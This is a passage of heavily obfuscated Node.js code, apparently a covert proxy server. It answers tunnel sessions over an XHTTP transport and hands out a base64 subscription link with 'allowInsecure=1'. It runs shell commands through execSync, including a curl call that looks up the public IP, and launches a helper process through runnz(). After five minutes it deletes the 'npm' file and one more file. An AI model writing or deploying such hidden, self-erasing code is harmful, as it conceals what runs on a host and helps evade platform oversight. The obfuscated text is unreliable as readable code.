_0x15cbf3=_0xd90970;if(!this[_0x15cbf3(0xb7)]||this[_0x15cbf3(0xb7)]['destroyed'])throw new Error('Remote\x20connection\x20not\x20available');return new Promise((_0x517430,_0x1fbaa4)=>{const _0x189fe5=_0x15cbf3;this[_0x189fe5(0xb7)][_0x189fe5(0x18b)](_0x3fdf5e,_0x330f69=>{const _0xf66213=_0x189fe5;_0x330f69?(log(_0xf66213(0x142),_0xf66213(0x10f)+_0x330f69['message']),_0x1fbaa4(_0x330f69)):_0x517430();});});}[_0xd90970(0x186)](){const _0x2c60f6=_0xd90970;if(!this['currentStreamRes']||!this['responseHeader'])return;try{!this[_0x2c60f6(0x137)]&&(this[_0x2c60f6(0xc4)][_0x2c60f6(0x18b)](this[_0x2c60f6(0x127)]),this['headerSent']=!![]),this[_0x2c60f6(0xb7)][_0x2c60f6(0x125)](this[_0x2c60f6(0xc4)]),this[_0x2c60f6(0xb7)]['on'](_0x2c60f6(0x147),()=>{const _0x38cd6f=_0x2c60f6;!this[_0x38cd6f(0xc4)][_0x38cd6f(0x182)]&&this[_0x38cd6f(0xc4)]['end']();}),this[_0x2c60f6(0xb7)]['on'](_0x2c60f6(0x142),_0x2a1339=>{const _0x379766=_0x2c60f6;log(_0x379766(0x142),_0x379766(0x132)+_0x2a1339['message']),!this[_0x379766(0xc4)]['writableEnded']&&this['currentStreamRes'][_0x379766(0x147)]();});}catch(_0x91eea7){log(_0x2c60f6(0x142),'Error\x20starting\x20downstream:\x20'+_0x91eea7[_0x2c60f6(0xb2)]),this['cleanup']();}}['cleanup'](){const _0x489f79=_0xd90970;!this['cleaned']&&(this[_0x489f79(0x122)]=!![],log('debug',_0x489f79(0x135)+this[_0x489f79(0x10b)]),this[_0x489f79(0xb7)]&&(this[_0x489f79(0xb7)][_0x489f79(0xaa)](),this[_0x489f79(0xb7)]=null),this[_0x489f79(0xcb)]=![],this[_0x489f79(0x137)]=![]);}}const metaInfo=execSync(_0xd90970(0x144),{'encoding':_0xd90970(0xd6)}),ISP=metaInfo[_0xd90970(0xc8)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb',{'encoding':_0xd90970(0xd6)})[_0xd90970(0xc8)]();}catch(_0x57e429){try{IP='['+execSync(_0xd90970(0xd4),{'encoding':'utf-8'})[_0xd90970(0xc8)]()+']';}catch(_0x31ab2c){log(_0xd90970(0x142),_0xd90970(0xef),_0x31ab2c[_0xd90970(0xb2)]),IP='localhost';}}const server=http[_0xd90970(0xd3)]((_0x405896,_0x257b86)=>{const _0x38f47a=_0xd90970,_0x29683a={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x38f47a(0x15a),'Cache-Control':_0x38f47a(0xb8),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x405896['url']==='/'){const _0x412a7f=path[_0x38f47a(0xe4)](__dirname,'index.html');fs[_0x38f47a(0x168)](_0x412a7f,'utf8',(_0x1c07c7,_0xdbe26)=>{const _0xe2f265=_0x38f47a;if(_0x1c07c7){_0x257b86[_0xe2f265(0x139)](0x1f4,{'Content-Type':'text/plain'}),_0x257b86[_0xe2f265(0x147)](_0xe2f265(0x167));return;}_0x257b86['writeHead'](0xc8,{'Content-Type':_0xe2f265(0x188)}),_0x257b86[_0xe2f265(0x147)](_0xdbe26);});return;}if(_0x405896[_0x38f47a(0x165)]==='/'+SUB_PATH){const _0x5e6fdb=_0x38f47a(0x163)+UUID+'@'+IP+_0x38f47a(0xfe)+IP+'&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+_0x38f47a(0xf0)+SETTINGS['XPATH']+_0x38f47a(0xea)+NAME+'-'+ISP,_0xb2eeba=Buffer[_0x38f47a(0x164)](_0x5e6fdb)[_0x38f47a(0xd8)]('base64');_0x257b86[_0x38f47a(0x139)](0xc8,{'Content-Type':_0x38f47a(0x109)}),_0x257b86['end'](_0xb2eeba+'\x0a');return;}const _0x215e7b=_0x405896[_0x38f47a(0x165)]['match'](new RegExp(XPATH+_0x38f47a(0xc5)));if(!_0x215e7b){_0x257b86[_0x38f47a(0x139)](0x194),_0x257b86[_0x38f47a(0x147)]();return;}const _0x1899e0=_0x215e7b[0x1],_0x1b11c6=_0x215e7b[0x2]?parseInt(_0x215e7b[0x2]):null;if(_0x405896['method']===_0x38f47a(0x16e)&&!_0x1b11c6){_0x29683a[_0x38f47a(0x152)]=_0x38f47a(0x151),_0x29683a[_0x38f47a(0x175)]=_0x38f47a(0xba);let _0x31bc74=sessions[_0x38f47a(0x178)](_0x1899e0);!_0x31bc74&&(_0x31bc74=new Session(_0x1899e0),sessions['set'](_0x1899e0,_0x31bc74),log(_0x38f47a(0x14c),_0x38f47a(0x170)+_0x1899e0));_0x31bc74['downstreamStarted']=!![];!_0x31bc74[_0x38f47a(0x15c)](_0x257b86,_0x29683a)&&(log('error',_0x38f47a(0xde)+_0x1899e0),!_0x257b86['headersSent']&&(_0x257b86[_0x38f47a(0x139)](0x1f4),_0x257b86[_0x38f47a(0x147)]()),_0x31bc74[_0x38f47a(0x171)](),sessions['delete'](_0x1899e0));return;}if(_0x405896['method']===_0x38f47a(0x12e)&&_0x1b11c6!==null){let _0x2b74b3=sessions['get'](_0x1899e0);!_0x2b74b3&&(_0x2b74b3=new Session(_0x1899e0),sessions[_0x38f47a(0x153)](_0x1899e0,_0x2b74b3),log(_0x38f47a(0x14c),_0x38f47a(0xd2)+_0x1899e0),setTimeout(()=>{const _0x50d46f=_0x38f47a,_0x4f32da=sessions[_0x50d46f(0x178)](_0x1899e0);_0x4f32da&&!_0x4f32da[_0x50d46f(0x12d)]&&(log(_0x50d46f(0xff),_0x50d46f(0x10c)+_0x1899e0+_0x50d46f(0xdc)),_0x4f32da[_0x50d46f(0x171)](),sessions[_0x50d46f(0x158)](_0x1899e0));},SETTINGS[_0x38f47a(0x104)]));let _0x404079=[],_0xe1ba35=0x0,_0x1a4842=![];_0x405896['on']('data',_0x5431c7=>{const _0x5b4c12=_0x38f47a;_0xe1ba35+=_0x5431c7[_0x5b4c12(0x189)];if(_0xe1ba35>SETTINGS[_0x5b4c12(0xc0)]){!_0x1a4842&&(_0x257b86['writeHead'](0x19d),_0x257b86[_0x5b4c12(0x147)](),_0x1a4842=!![]);return;}_0x404079[_0x5b4c12(0x121)](_0x5431c7);}),_0x405896['on'](_0x38f47a(0x147),async()=>{const _0x4d249b=_0x38f47a;if(_0x1a4842)return;try{const _0x3aa450=Buffer['concat'](_0x404079);log('info',_0x4d249b(0xb6)+_0x1b11c6+_0x4d249b(0x146)+_0x3aa450['length']),await _0x2b74b3[_0x4d249b(0x111)](_0x1b11c6,_0x3aa450),!_0x1a4842&&(_0x257b86[_0x4d249b(0x139)](0xc8,_0x29683a),_0x1a4842=!![]),_0x257b86[_0x4d249b(0x147)]();}catch(_0x5a7e1c){log(_0x4d249b(0x142),_0x4d249b(0x15d)+_0x5a7e1c[_0x4d249b(0xb2)]),_0x2b74b3[_0x4d249b(0x171)](),sessions[_0x4d249b(0x158)](_0x1899e0),!_0x1a4842&&(_0x257b86['writeHead'](0x1f4),_0x1a4842=!![]),_0x257b86[_0x4d249b(0x147)]();}});return;}_0x257b86[_0x38f47a(0x139)](0x194),_0x257b86[_0x38f47a(0x147)]();});server['on']('secureConnection',_0x31dedf=>{const _0x9ab1e6=_0xd90970;log('debug',_0x9ab1e6(0x129)+(_0x31dedf['alpnProtocol']||_0x9ab1e6(0xc1)));});function generatePadding(_0x4ff2f7,_0x27f692){const _0x5f1147=_0xd90970,_0x2314fe=_0x4ff2f7+Math[_0x5f1147(0xd0)](Math[_0x5f1147(0x11f)]()*(_0x27f692-_0x4ff2f7));return Buffer[_0x5f1147(0x164)](Array(_0x2314fe)[_0x5f1147(0xaf)]('X')[_0x5f1147(0xe4)](''))[_0x5f1147(0xd8)](_0x5f1147(0xb9));}server[_0xd90970(0xed)]=0x975e0,server['headersTimeout']=0x98968,server['on']('error',_0x581525=>{const _0x45f0a6=_0xd90970;log(_0x45f0a6(0x142),_0x45f0a6(0x13a)+_0x581525[_0x45f0a6(0xb2)]);});const delFiles=()=>{const _0x5400c1=_0xd90970;['npm',_0x5400c1(0x172)]['forEach'](_0xc51eb4=>fs[_0x5400c1(0x13d)](_0xc51eb4,()=>{}));};server[_0xd90970(0x155)](PORT,()=>{const _0x4959f1=_0xd90970;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console['log'](_0x4959f1(0x107)+PORT);});
